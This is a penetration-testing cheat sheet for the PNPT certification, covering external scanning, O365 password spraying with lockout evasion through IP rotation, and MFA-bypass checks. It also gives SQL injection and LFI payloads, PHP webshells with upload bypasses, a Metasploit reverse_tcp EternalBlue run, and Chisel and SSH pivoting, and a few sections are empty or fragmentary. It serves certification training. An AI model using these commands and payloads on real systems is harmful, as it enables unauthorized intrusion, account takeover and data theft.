This is an external penetration testing techniques cheat sheet for the PNPT (Practical Network Penetration Tester) certification by TCM Security.

Each step is organized to reflect the actual workflow used in both the exam and real-world penetration tests.

### [External Penetration Attack Flow]

External penetration testing involves executing real attacks based on intelligence gathered during OSINT.

```bash
[OSINT complete → email list, subdomains, leaked credentials secured]

Phase 1. Scanning & Enumeration
  Map the full attack surface of the target
  (Nmap, Nessus, Nikto, Gobuster ...)

[Open ports, service versions, web directories identified]

Phase 2. Login Portal Attacks
  Attack external portals using collected emails and credentials
  (o365spray, TREVORspray, MSOLSpray, hydra ...)

[Account takeover or internal network entry point secured]

Phase 3. Web Application Attacks
  Discover and exploit vulnerabilities in found web services
  (Burp Suite, sqlmap, file upload, LFI ...)

[RCE or credential theft achieved]

Phase 4. Service Vulnerability Exploitation
  Exploit vulnerabilities in exposed services (FTP, SSH, SMB, RDP, etc.)
  (searchsploit, hydra, EternalBlue ...)

[Initial foothold established]

-----Internal Penetration-----

Phase 5. Internal Network Pivot
  Move from the obtained shell into the internal network
  (Chisel, sshuttle, SSH tunneling, proxychains ...)

[Internal network access → move to AD attack phase]
```

External environments are tightly secured, so RCE is rarely achievable.

In most cases, entry is gained by attacking login portals with leaked credentials or weak password spraying.

### [Phase 1: Scanning & Enumeration]

The goal of the scanning phase is to identify open ports, running services, and web directories on the target.

### [1-1: Nmap — Port Scanning]

Nmap is the essential tool run first in every external penetration test.

It identifies open ports and service versions to determine subsequent attack vectors.

**Requirements:**

```bash
1. Target IP or domain
2. Kali Linux (pre-installed)
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Quick initial scan → enumerate top 1000 ports
2. Full TCP port scan → discover services on non-standard ports
3. Service version + script scan on discovered ports
4. UDP scan → discover hidden services like SNMP, TFTP
5. Vulnerability script scan → check for known CVEs

--------------------------------------------------------------

(Commands)

# Step 1: Quick initial scan
nmap -sS -Pn --top-ports 1000 -oA initial TARGET

# Step 2: Full TCP port scan (essential!)
nmap -sS -Pn -p- -T4 -oA full_tcp TARGET

# Step 3: Service version + default scripts on discovered ports
nmap -sC -sV -Pn -p 21,22,80,443,445,3389 -oA services TARGET

# Step 4: UDP scan
nmap -sU -Pn --top-ports 250 -oA udp TARGET

# Step 5: Vulnerability scripts
nmap -sV --script vuln -Pn -p 21,22,80,443,445 -oA vuln TARGET

# Key option descriptions
# -sS         : TCP SYN scan (fast and stealthy, requires root)
# -sT         : TCP Connect scan (when root is unavailable)
# -sU         : UDP scan
# -sC         : run default scripts (--script=default)
# -sV         : service version detection
# -Pn         : skip host discovery (essential for external — ICMP usually blocked)
# -p-         : all 65535 ports
# -p 80,443   : specific ports
# --top-ports : top N ports
# -T4         : timing level 4 (fast, recommended for external)
# -oA         : save all output formats simultaneously (strongly recommended)
# -A          : combines -sC -sV -O --traceroute

-------------------------------------------------------------------

(Per-service NSE Scripts)

# EternalBlue (MS17-010)
nmap --script smb-vuln-ms17-010 -p 445 TARGET

# Heartbleed
nmap --script ssl-heartbleed -p 443 TARGET

# FTP anonymous login
nmap --script ftp-anon -p 21 TARGET

# Web directory enumeration
nmap --script http-enum TARGET

# All SMB vulnerabilities
nmap --script smb-vuln-* -p 445 TARGET

-------------------------------------------------------------------

(searchsploit integration)

# Integrate Nmap XML output with searchsploit (core workflow)
nmap -sV -Pn -p- -oX scan.xml TARGET
searchsploit --nmap scan.xml
```

※ The -Pn flag is almost always required for external tests (ICMP is typically blocked by firewalls).

※ Saving with -oA allows later integration with searchsploit --nmap.

### [1-2: Nessus — Automated Vulnerability Scanner]

Nessus is the automated vulnerability scanner run first in the External Pentest Playbook process.

It automatically detects known CVEs and configuration vulnerabilities.

**Requirements:**

```bash
1. Nessus Essentials (free) or Professional installed
2. Target IP or IP range
```

**Attack Flow:**

```bash
(Attack Flow)

1. New Scan → select Advanced Scan
2. Enter target IP
3. Discovery > Port settings: 1-65535 (full port scan — essential!)
4. Enable web application scan if a web server is found
5. Run scan → prioritize Critical/High findings
6. Export results → include in report

--------------------------------------------------------------

(Key Settings)

Scan Settings:
  Ports: 1-65535         → full port scan (must change from default)
  Disable "Ping the Remote Host"  → prevents false positives in external tests

Export results:
  Supports PDF / HTML / CSV / Nessus formats
```

※ Hosts behind a CDN may appear to have all ports open → manual verification required.

※ CDN = a proxy server in front of the real server; scanning it returns CDN info, not the actual server.

### [1-3: Nikto — Web Server Vulnerability Scanner]

Nikto automatically checks for 6,700+ dangerous files, missing security headers, default credentials, XSS, SQLi, and more.

**Requirements:**

```bash
1. Kali Linux (pre-installed)
2. Target web server URL
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Discover web service from Nmap (ports 80, 443, 8080, etc.)
2. Run Nikto to auto-scan for web server vulnerabilities
3. Manually verify discovered vulnerabilities
4. Include findings in report

--------------------------------------------------------------

(Commands)

# Basic scan
nikto -h http://TARGET

# HTTPS scan
nikto -h https://TARGET -ssl -p 443

# Multiple ports at once
nikto -h TARGET -p 80,443,8080,8443

# Route through Burp Suite proxy
nikto -h http://TARGET -useproxy http://127.0.0.1:8080

# Save results to file
nikto -h https://TARGET -ssl -o nikto_report.html -Format htm

# Rate limiting (IDS evasion)
nikto -h http://TARGET -Pause 3

# Option descriptions
# -h         : target host
# -ssl       : force SSL
# -p         : port (comma-separated for multiple)
# -useproxy  : use proxy
# -o         : output file
# -Format    : output format (csv, htm, json, xml, txt)
# -Pause     : delay between tests
# -Tuning    : select test types
```

※ Nikto is a very noisy tool and is easily detected by IDS/IPS.

※ Detection doesn't count against you in the exam, but exercise caution in real engagements.

### [1-4: Gobuster — Directory/Subdomain Brute-Force]

Gobuster discovers web directories, files, subdomains, and virtual hosts via brute-force.

**Requirements:**

```bash
1. Kali Linux (pre-installed)
2. Target URL or domain
3. Wordlist available (/usr/share/wordlists/)
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Discover web service from Nmap
2. Use Gobuster dir to find hidden directories/files
3. Discover login pages, admin panels, API endpoints
4. Set discovered paths as additional attack targets

--------------------------------------------------------------

(DIR mode — directories/files)

# Basic directory scan
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Include file extensions + recursive (PNPT recommended)
gobuster dir -u http://TARGET \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,asp,aspx,jsp -t 50 -o dir_results.txt \
  --recursive

# HTTPS + ignore SSL
gobuster dir -u https://TARGET -w wordlist.txt -k

# With authentication
gobuster dir -u http://TARGET -w wordlist.txt -U admin -P password

# Option descriptions
# -u         : target URL
# -w         : wordlist
# -x         : file extensions (comma-separated)
# -t         : thread count (default 10, 50 recommended)
# -o         : output file
# -k         : ignore SSL certificate
# -s         : allowed status codes (default 200,204,301,302,307,401,403)
# -b         : excluded status codes
# -l         : show response length
# --recursive : recursively scan discovered directories (increases detection risk)

--------------------------------------------------------------

(DNS mode — subdomains)

gobuster dns -d TARGET.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o dns_results.txt

--------------------------------------------------------------

(VHOST mode — virtual hosts)

gobuster vhost -u http://TARGET.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o vhost_results.txt
```

※ Recursive mode enables deeper directory scanning (but increases traffic and detection risk).

### [Phase 2: Login Portal Attacks]

The goal is to access external login portals using email lists and leaked credentials gathered during OSINT.

Targets include O365, OWA, VPN portals, and other internet-exposed login services.

### [2-1: o365spray — O365 User Enumeration & Password Spray]

o365spray performs user enumeration and password spraying against Microsoft O365.

**Requirements:**

```bash
1. Target must be using O365
2. Valid email list
3. Python environment
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Verify the domain uses O365
2. Enumerate valid users (no account lockout)
3. Password spray (check lockout policy, run safely)
4. Use successful accounts to access email, SharePoint, VPN, etc.

--------------------------------------------------------------

(Installation)

git clone https://github.com/0xZDH/o365spray.git
cd o365spray && pip install -r requirements.txt

--------------------------------------------------------------

(Commands)

# Step 1: Verify domain uses O365
o365spray --validate --domain target.com

# Step 2: Enumerate valid users
o365spray --enum -U usernames.txt --domain target.com

# Step 3: Password spray
o365spray --spray -U valid_users.txt -p 'Winter2025!' --domain target.com \
  --count 1 --lockout 15

# Multiple passwords + lockout protection
o365spray --spray -U valid_users.txt -P passwords.txt --domain target.com \
  --count 1 --lockout 30 --safe 10

# Option descriptions
# --validate     : verify domain uses O365
# --enum         : user enumeration
# --spray        : password spray
# -U             : user list file
# -P             : password list file
# -p             : single password
# --count N      : attempts before lockout (1 recommended)
# --lockout MIN  : wait time for lockout reset (minutes)
# --safe N       : auto-stop if N accounts get locked
# --sleep SEC    : delay between rounds
# --jitter       : randomize delay (detection evasion)
```

※ If lockout policy is 5 attempts, try only 4 and wait for the lockout period to reset (account lockout disrupts business operations).

### [2-2: TREVORspray — SSH Proxy IP Rotation Spray]

TREVORspray bypasses Azure Smart Lockout via IP rotation through SSH proxies.

This tool is taught directly in the PNPT External Pentest Playbook course.

※ Azure Smart Lockout blocks repeated login failures from the same IP, but IP rotation allows bypassing the block.

**Requirements:**

```bash
1. External server with SSH access (AWS EC2 Free Tier works)
2. Valid email list
3. Python environment
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Prepare external SSH servers (e.g., AWS EC2) for IP rotation
2. Recon the domain (MX, TXT, tenant ID, SharePoint URL)
3. Run spray via SSH proxy
4. Confirm Smart Lockout bypass

--------------------------------------------------------------

(Installation)

pip3 install trevorspray

--------------------------------------------------------------

(Commands)

# Domain recon (check for MFA bypass paths)
trevorspray --recon corp.com

# Basic spray
trevorspray -u valid_emails.txt -p 'Welcome123' --delay 5

# SSH proxy IP rotation (core technique)
trevorspray -u emails.txt -p 'Winter2025!' --delay 10 \
  --no-current-ip --ssh ubuntu@[EC2-IP] -k ec2.pem

# Multiple SSH server rotation
trevorspray -u emails.txt -p 'Spring2025!' \
  --ssh ubuntu@1.2.3.4 ubuntu@5.6.7.8 -k hacking.pem \
  --delay 30 --lockout-delay 30 --jitter 10

# Option descriptions
# -u             : email list
# -p             : password
# --delay        : delay between requests (seconds)
# --ssh          : SSH proxy server
# -k             : SSH key file
# --no-current-ip: exclude current IP (prevents spraying from your own IP)
# --lockout-delay: additional wait time if lockout occurs
# --jitter       : randomize delay
```

※ Using an AWS EC2 Free Tier instance (Ubuntu) as an SSH proxy enables free IP rotation.

### [2-3: MFASweep — Check for MFA-Unprotected Protocols]

MFASweep finds legacy Microsoft protocols that bypass MFA even on MFA-enabled accounts.

Protocols like IMAP, SMTP, and EWS may not enforce MFA — only credentials are required.

**Requirements:**

```bash
1. Valid credentials (obtained via spray)
2. PowerShell environment
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Obtain valid credentials via o365spray
2. Run MFASweep to find protocols without MFA
3. Discover a bypassable protocol → authenticate via that protocol
4. Access email, files, internal systems

--------------------------------------------------------------

(Commands)

Import-Module MFASweep.ps1

# Basic check
Invoke-MFASweep -Username user@domain.com -Password Winter2025

# Full check including ADFS
Invoke-MFASweep -Username user@domain.com -Password Winter2025 -Recon -IncludeADFS
```

※ MFA bypass target protocols: ActiveSync, EWS, IMAP, SMTP, POP, Graph API, AutoDiscover

### [2-4: General Web Login Portals — Hydra Brute-Force]

Brute-force attacks against VPN portals, OWA, web admin panels, and other generic login forms.

**Requirements:**

```bash
1. Target login URL
2. Username/email list
3. Password list or leaked passwords
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Discover login page with Gobuster
2. Capture login request with Burp Suite → identify parameters
3. Brute-force with Hydra or Burp Intruder
4. On success → gather additional internal information

--------------------------------------------------------------

(Hydra Commands)

# HTTP form brute-force
hydra -L users.txt -P passwords.txt TARGET http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4

# FTP
hydra -L users.txt -P passwords.txt ftp://TARGET

# RDP
hydra -l administrator -P rockyou.txt rdp://TARGET -t 1

# SMB
hydra -L users.txt -P passwords.txt smb://TARGET

# Leaked credential pairs (user:pass format)
hydra -C creds.txt ssh://TARGET

# Option descriptions
# -l         : single username
# -L         : username list file
# -p         : single password
# -P         : password list file
# -C         : user:pass format file
# -t         : thread count
# -V         : verbose (show all attempts)
# -f         : stop on first success
```

### [Phase 3: Web Application Attacks]

The goal is to discover and exploit vulnerabilities in found web services.

### [3-1: Burp Suite — Web Application Testing]

Burp Suite is the core tool for web application penetration testing — it intercepts and manipulates HTTP traffic.

**Requirements:**

```bash
1. Kali Linux (Community Edition is free)
2. Browser proxy set to 127.0.0.1:8080
3. For HTTPS sites: install Burp CA certificate (visit http://burpsuite)
```

**Attack Flow + Tools & Commands:**

```bash
(Attack Flow)

1. Set browser proxy → Burp 127.0.0.1:8080
2. Browse the target site → review requests in Proxy > HTTP History
3. Right-click suspicious request → Send to Repeater
4. Manually modify parameters in Repeater → verify vulnerabilities
5. If automation is needed → Send to Intruder

--------------------------------------------------------------

(Proxy / Intercept)

Intercept is on toggle → capture request
Forward   : send request
Drop      : block request
Ctrl+R    : send to Repeater
Ctrl+I    : send to Intruder

--------------------------------------------------------------

(Repeater — Manual Testing)

# SQLi test
id=1 → id=1'                 (check for error)
id=1 → id=1 OR 1=1--

# XSS test
name=test → name=<script>alert(1)</script>

# IDOR test
id=1 → id=2, id=3            (access other users' data)

# Auth bypass
admin=false → admin=true

--------------------------------------------------------------

(Intruder — Automated Attacks)

Attack types:
Sniper       → single payload, test one parameter at a time (SQLi/XSS fuzzing)
Pitchfork    → multiple payloads in sync (credential pair testing)
Cluster Bomb → all combinations (login brute-force)

Identify success:
→ Filter by status code or Content-Length anomalies
→ Set Grep-Match keywords like "Welcome", "Invalid"

--------------------------------------------------------------

(sqlmap integration)

# Save request from Burp → use in sqlmap
# HTTP History → right-click request → Save Item → request.txt
sqlmap -r request.txt --batch --dbs
```

### [3-2: SQL Injection]

SQLi occurs when user input is directly inserted into SQL queries without sanitization.

It can lead to auth bypass, data extraction, and even OS command execution.

**Requirements:**

```bash
1. Web application that uses SQL queries
2. Parameter that doesn't filter user input
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Enter ' or " in a parameter → check for SQL error
2. Try auth bypass payloads on login
3. Use UNION-based queries to map DB structure
4. Automate with sqlmap → dump full DB

--------------------------------------------------------------

(Auth Bypass Payloads)

' OR 1=1--
' OR 1=1#
admin'--
' OR ''='
') OR ('1'='1'--

--------------------------------------------------------------

(Manual UNION-Based Enumeration)

' ORDER BY 1--                              # find column count (increment until error)
' ORDER BY 3--                              # confirm 3 columns
' UNION SELECT NULL,NULL,NULL--             # match column count
' UNION SELECT 1,2,3--                      # find output positions
' UNION SELECT username,password,3 FROM users-- # extract data
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--  # list tables

--------------------------------------------------------------

(sqlmap)

# Basic detection
sqlmap -u "http://TARGET/page.php?id=1" --batch

# From Burp request file (recommended)
sqlmap -r request.txt --batch

# Step-by-step DB enumeration
sqlmap -u URL --dbs --batch                         # list databases
sqlmap -u URL -D dbname --tables --batch            # list tables
sqlmap -u URL -D dbname -T users --columns --batch  # list columns
sqlmap -u URL -D dbname -T users -C username,password --dump --batch  # dump data

# OS shell (requires DBA privileges)
sqlmap -u URL --os-shell

# Read file
sqlmap -u URL --file-read="/etc/passwd"

# WAF bypass
sqlmap -u URL --tamper=space2comment,randomcase --random-agent --level=3 --risk=2
```

### [3-3: LFI / RFI — File Inclusion Vulnerabilities]

LFI (Local File Inclusion) reads local server files; RFI (Remote File Inclusion) loads and executes remote malicious files.

※ LFI = vulnerability to read files on the server

※ RFI = vulnerability to inject and execute external malicious files

※ Both can lead to RCE, but LFI requires additional steps like Log Poisoning while RFI allows direct RCE.

**Requirements:**

```bash
1. Web application that passes file paths as parameters
2. Insufficient input filtering
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Look for parameters like page=, file=, include=
2. Try path traversal to access /etc/passwd
3. If LFI confirmed → read source code via PHP wrappers
4. Attempt RCE via log poisoning or PHP wrappers

--------------------------------------------------------------

(LFI Path Traversal)

../../../etc/passwd
....//....//....//etc/passwd     # bypass double-dot filter
..%2f..%2f..%2fetc%2fpasswd      # URL encoding bypass

# Windows targets
..\..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini

--------------------------------------------------------------

(PHP Wrappers)

# Read source code
?page=php://filter/convert.base64-encode/resource=config.php

# Code execution
?page=php://input
POST: <?php system('whoami'); ?>

# Inline execution
?page=data://text/plain,<?php system($_GET['cmd']); ?>

--------------------------------------------------------------

(Log Poisoning → RCE)

# 1. Inject PHP code into Apache logs
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET/

# 2. Load log file via LFI + execute command
?page=../../../var/log/apache2/access.log&cmd=whoami
```

### [3-4: File Upload Vulnerabilities]

File upload vulnerabilities occur when the server fails to sufficiently validate uploaded files, allowing malicious files to execute.

**Requirements:**

```bash
1. Web application with a file upload feature
2. Uploaded files stored in a web-accessible path where they can be executed
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Upload a normal image → confirm storage path
2. Attempt direct PHP webshell upload
3. If blocked → apply extension bypass techniques
4. Upload succeeds → access upload path → execute commands

--------------------------------------------------------------

(PHP Webshells)

<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_REQUEST['cmd']); ?>

# Simple with GIF header added
GIF89a;<?php system($_GET['cmd']); ?>

--------------------------------------------------------------

(Extension Bypass Techniques)

shell.phtml          # alternative PHP extension
shell.php5
shell.php.jpg        # double extension
shell.php%00.jpg     # null byte (old versions)
shell.PHP            # uppercase bypass

--------------------------------------------------------------

(MIME Type Bypass — via Burp)

Content-Type: application/php → change to: Content-Type: image/jpeg

--------------------------------------------------------------

(Execute After Upload)

http://TARGET/uploads/shell.php?cmd=whoami
http://TARGET/uploads/shell.php?cmd=id
http://TARGET/uploads/shell.php?cmd=cat+/etc/passwd
```

### [Phase 4: Service Vulnerability Exploitation]

The goal is to directly exploit vulnerabilities in services discovered by Nmap.

### [4-1: searchsploit — Offline Exploit Search]

searchsploit searches a local copy of Exploit-DB for publicly available exploits by service name and version.

**Requirements:**

```bash
1. Kali Linux (pre-installed)
2. Nmap service version scan results
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Identify service version with Nmap -sV
2. Search for exploits for that version with searchsploit
3. Copy and modify the exploit code
4. Run exploit → obtain shell

--------------------------------------------------------------

(Commands)

# Basic search
searchsploit apache 2.4
searchsploit wordpress 5.8
searchsploit openssh 7.2

# Search by CVE
searchsploit --cve 2021-44228

# View exploit content
searchsploit -x 39446

# Copy to current directory
searchsploit -m 39446

# Show Exploit-DB URL
searchsploit -w wordpress 5.0

# Exclude DoS/PoC results
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"

# Nmap XML integration (core workflow!)
nmap -sV -Pn -p- -oX scan.xml TARGET
searchsploit --nmap scan.xml
searchsploit --nmap scan.xml -v    # more combinations
```

※ Search uses AND logic — more keywords means fewer results. Start broad, then narrow down.

### [4-2: FTP (Port 21)]

```bash
(Attack Flow)

1. Try anonymous login
2. If anonymous login succeeds → download all files
3. Brute-force → steal credentials
4. vsftpd 2.3.4 → exploit backdoor

--------------------------------------------------------------

(Commands)

# Anonymous login
ftp TARGET   # username: anonymous, password: (blank)
nmap --script ftp-anon -p 21 TARGET

# Download all files
wget -m ftp://anonymous:anonymous@TARGET

# Brute-force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET

use exploit/unix/ftp/vsftpd_234_backdoor

```

### [4-3: SSH (Port 22)]

```bash
(Attack Flow)

1. Try default credentials (root:root, admin:admin)
2. Brute-force with Hydra
3. Try discovered private key files (.pem, id_rsa)
4. If private key has a passphrase → crack with john

--------------------------------------------------------------

(Commands)

# Brute-force (4 threads recommended — SSH is slow)
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET -t 4 -V
hydra -L users.txt -P passwords.txt TARGET ssh -t 4

# Connect with private key
chmod 600 id_rsa && ssh -i id_rsa user@TARGET

# Crack key passphrase
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### [4-4: SMB (Port 445)]

```bash
(Attack Flow)

1. Enumerate shares and users via null session
2. Check for EternalBlue (MS17-010) vulnerability
3. Brute-force or Pass-the-Hash
4. Exploit with Metasploit

--------------------------------------------------------------

(Commands)

# Null session enumeration
smbclient --no-pass -L //TARGET
enum4linux -a TARGET
crackmapexec smb TARGET -u '' -p '' --shares

# Check for EternalBlue

# EternalBlue exploit (Metasploit)

set RHOSTS TARGET
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [ATTACKER-IP]
run

# Brute-force
crackmapexec smb TARGET -u users.txt -p 'Password1' --continue-on-success
```

### [Phase 5: Internal Network Pivot]

The goal is to access the internal network through the shell obtained externally.

This is the phase that most PNPT exam candidates find the most challenging.

※ Pivoting = the compromised external server is connected to internal servers, so you move into the internal network through it.

### [5-1: Obtaining a Reverse Shell]

A stable reverse shell is essential before pivoting into the internal network.

**Attack Flow + Commands:**


### [5-2: Chisel — HTTP Tunneling Pivot]

Chisel is an HTTP-based TCP tunneling tool and the most commonly used pivot tool in the PNPT exam.

**Requirements:**

```bash
1. Chisel binary needed on both attacker and victim machines
2. HTTP connection must be possible from victim → attacker
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Start Chisel server on attacker side
2. Upload and run Chisel client on victim machine
3. SOCKS5 proxy is created on attacker side
4. Configure proxychains and access internal network

--------------------------------------------------------------

(Attacker side — server)

./chisel server -p 8080 --reverse

--------------------------------------------------------------

(Victim side — client)

# SOCKS5 reverse proxy
./chisel client [ATTACKER-IP]:8080 R:socks
# → creates SOCKS5 proxy on attacker's port 1080

# Specific port forwarding
./chisel client [ATTACKER-IP]:8080 R:4444:127.0.0.1:80

--------------------------------------------------------------

(proxychains configuration)

sudo nano /etc/proxychains4.conf
→ uncomment dynamic_chain
→ add to end of [ProxyList]:
socks5 127.0.0.1 1080

--------------------------------------------------------------

(proxychains usage)

# Must use -sT -Pn! (ICMP unavailable through proxy)
proxychains nmap -sT -Pn -p 22,80,443,445 [INTERNAL-IP]
proxychains crackmapexec smb [INTERNAL-IP] -u '' -p '' --shares
proxychains ssh user@[INTERNAL-IP]
proxychains firefox
```

※ **ICMP (ping) does not work** through SOCKS — a ping failure doesn't mean the pivot failed.

※ Nmap must always use **-sT -Pn** (SYN scan and ICMP ping are not available through a proxy).

### [5-3: sshuttle — SSH-Based Transparent VPN]

sshuttle is a transparent VPN over SSH that allows full access to the internal network without configuring a proxy.

This tool is taught directly in Heath Adams' updated course.

**Requirements:**

```bash
1. SSH access to the victim machine
2. Python must be installed on the victim machine
```

**Attack Flow + Commands:**

```bash
(Attack Flow)

1. Obtain SSH access to external victim machine
2. Run sshuttle specifying the internal network range
3. Full internal network access, like a transparent VPN
4. Use tools directly without proxychains

--------------------------------------------------------------

(Commands)

# Basic usage
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET]

# Example
sshuttle -r user@172.16.0.5 10.10.10.0/24

# With SSH key
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET] -e 'ssh -i /path/to/key'

# Exclude pivot IP (prevents routing loop)
sshuttle -r user@[PIVOT-IP] [INTERNAL-SUBNET] -x [PIVOT-IP]

# Full subnet
sshuttle -r user@[PIVOT-IP] 0/0 -x [PIVOT-IP]   # pivot all traffic
```

### [5-4: SSH Port Forwarding]

SSH's built-in port forwarding can tunnel specific ports or create a full SOCKS proxy.

※ Port forwarding = tunnel a single specific port

※ SOCKS proxy = route all traffic through the tunnel = full internal network access

```bash
# Local port forwarding (access internal service locally)
# Example: access internal web server (10.10.10.5:80) via local port 8080
ssh -L 127.0.0.1:8080:10.10.10.5:80 user@[PIVOT-IP] -N

# Dynamic port forwarding (SOCKS5 proxy)
ssh -D 1080 user@[PIVOT-IP] -N
# → add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf

# Remote port forwarding (expose victim port to attacker)
ssh -R 4444:127.0.0.1:4444 user@[ATTACKER-IP] -N

# Option descriptions
# -L : local port forwarding
# -D : dynamic port forwarding (SOCKS)
# -R : remote port forwarding
# -N : no command execution, forwarding only
# -f : run in background
```
